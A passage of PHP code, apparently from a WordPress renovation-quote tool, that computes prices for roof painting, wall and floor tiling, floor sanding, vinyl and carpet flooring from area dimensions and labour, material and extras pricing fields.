                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$supply_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $supply_total = $supply_total + $labour_and_material_total ;
                                }
                                elseif($supply_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $supply_total = $supply_total + $range_price_total;
                                }

                        }

                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }


	                              $painting_total = $type_total + $prep_total + $scaffolding_total + $trim_total + $extras_total;
                                $paint_supply = $painting_total * $supply_total / 100;
					                      $paint_roof_total = $painting_total + $paint_supply;

                                $total = $total + $paint_roof_total;


                }

	    // formulas for Roof painting
        if(get_the_title($t) == 'Roof Painting') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'type') {
                                                $type_title = $d['title'];
                                                $type_prices = $d['type_of_price'];
                                                $type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'prep') {
                                                $prep_title = $d['title'];
                                                $prep_prices = $d['type_of_price'];
                                                $prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'scaffolding') {
                                                $scaffolding_title = $d['title'];
                                                $scaffolding_prices = $d['type_of_price'];
                                                $scaffolding_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'supply') {
                                                $supply_title = $d['title'];
                                                $supply_prices = $d['type_of_price'];
                                                $supply_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                           					}


                                $roof_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $type = $data['type'];
                $type_total = 0;
                foreach($type_data as $temp) {
                        if( in_array($temp['title'],$type) ) {


                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total +  ( $labour_and_material_total * $roof_area);
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ( $range_price_total * $roof_area);
                                }

                        }

                }

                $prep = $data['prep'];
                $prep_total = 0;
                foreach($prep_data as $temp) {
                        if( in_array($temp['title'],$prep) ) {


                                if($prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $prep_total = $prep_total +  ( $labour_and_material_total * $roof_area);
                                }
                                elseif($prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $prep_total = $prep_total + ( $range_price_total * $roof_area);
                                }

                        }

                }


                $scaffolding = $data['scaffolding'];
                $scaffolding_total = 0;
                foreach($scaffolding_data as $temp) {
                        if( in_array($temp['title'],$scaffolding) ) {


                                if($scaffolding_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$scaffolding_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $scaffolding_total = $scaffolding_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($scaffolding_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $scaffolding_total = $scaffolding_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

	              $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {


                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

                $supply = $data['supply'];
                $supply_total = 0;
                foreach($supply_data as $temp) {
                        if( in_array($temp['title'],$supply) ) {


                                if($supply_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$supply_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $supply_total = $supply_total + $labour_and_material_total ;
                                }
                                elseif($supply_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $supply_total = $supply_total + $range_price_total;
                                }

                        }

                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }


	                              $painting_total = $type_total + $prep_total + $scaffolding_total + $trim_total + $extras_total;
                                $paint_supply = $painting_total * $supply_total / 100;
					                      $paint_roof_total = $painting_total + $paint_supply;

                                $total = $total + $paint_roof_total;


                }

	
        // formulas for wall tiling
        if(get_the_title($t) == 'Wall Tiles') {

                                $all_scope_data = get_field('quote_fields',$t);

                                     $width = $data['area_width'];
                                     $height = $data['area_height'];
					                           $supply_area = $data['supply_area'];
					                           $supply_price = $data['supply_price'];
                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current') {
                                                $current_title = $d['title'];
                                                $current_prices = $d['type_of_price'];
                                                $current_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'proposed') {
                                                $proposed_title = $d['title'];
                                                $proposed_prices = $d['type_of_price'];
                                                $proposed_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                     }

					
	              $wall_area = $width * $height;
                $supply_total = $supply_area * $supply_price;
					
					      $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {


                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	
	              $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( $temp['title'] == $proposed ) {


                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

	                              $walls_total = $current_total + $proposed_total;
					                      $tile_wall_total = $walls_total + $extras_total + $supply_total;

                                $total = $total + $tile_wall_total;


                }

        // formulas for wall tiling
        if(get_the_title($t) == 'Floor Tiles') {

                                $all_scope_data = get_field('quote_fields',$t);

                                     $width = $data['area_width'];
                                     $length = $data['area_length'];
					                           $supply_area = $data['supply_area'];
					                           $supply_price = $data['supply_price'];
                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current') {
                                                $current_title = $d['title'];
                                                $current_prices = $d['type_of_price'];
                                                $current_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'proposed') {
                                                $proposed_title = $d['title'];
                                                $proposed_prices = $d['type_of_price'];
                                                $proposed_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                     }

					
	              $floor_area = $width * $length;
                $supply_total = $supply_area * $supply_price;
					
					      $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {


                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	
	              $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( $temp['title'] == $proposed ) {


                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	              $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

	                              $floor_total = $current_total + $proposed_total;
					                      $tile_floor_total = $floor_total + $extras_total + $supply_total;

                                $total = $total + $tile_floor_total;


                } 
	
	 // formulas for floor Sanding
        if(get_the_title($t) == 'Floor Sanding') {

                                $all_scope_data = get_field('quote_fields',$t);

                                     $width = $data['area_width'];
                                     $length = $data['area_length'];
					                           $supply_area = $data['supply_area'];
					                           $supply_price = $data['supply_price'];
                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current') {
                                                $current_title = $d['title'];
                                                $current_prices = $d['type_of_price'];
                                                $current_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'proposed') {
                                                $proposed_title = $d['title'];
                                                $proposed_prices = $d['type_of_price'];
                                                $proposed_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                     }

					
	              $floor_area = $width * $length;
					
					      $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {


                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	
	              $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( $temp['title'] == $proposed ) {


                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	              $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

	                              $floor_total = $current_total + $proposed_total;
					                      $tile_floor_total = $floor_total + $extras_total;

                                $total = $total + $tile_floor_total;


                } 
	     
	      // formulas for vinyl flooring
        if(get_the_title($t) == 'Vinyl Flooring') {

                                     $all_scope_data = get_field('quote_fields',$t);

                                     $width = $data['area_width'];
                                     $length = $data['area_length'];
					                           $supply_area = $data['supply_area'];
					                           $supply_price = $data['supply_price'];
                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current') {
                                                $current_title = $d['title'];
                                                $current_prices = $d['type_of_price'];
                                                $current_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'proposed') {
                                                $proposed_title = $d['title'];
                                                $proposed_prices = $d['type_of_price'];
                                                $proposed_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                     }

					
	              $floor_area = $width * $length;
                $supply_total = $supply_area * $supply_price;
					
					      $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {


                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	
	              $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( $temp['title'] == $proposed ) {


                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	              $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

	                              $floor_total = $current_total + $proposed_total;
					                      $vinyl_floor_total = $floor_total + $extras_total + $supply_total;

                                $total = $total + $vinyl_floor_total;


                }
	         // formulas for carpet flooring
        if(get_the_title($t) == 'Carpet Flooring') {

                                     $all_scope_data = get_field('quote_fields',$t);

                                     $width = $data['area_width'];
                                     $length = $data['area_length'];
					                           $supply_area = $data['supply_area'];
					                           $supply_price = $data['supply_price'];
                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current') {
                                                $current_title = $d['title'];
                                                $current_prices = $d['type_of_price'];
                                                $current_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'proposed') {
                                                $proposed_title = $d['title'];
                                                $proposed_prices = $d['type_of_price'];
                                                $proposed_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                     }

					
	              $floor_area = $width * $length;
                $supply_total = $supply_area * $supply_price;
					
					      $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {


                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
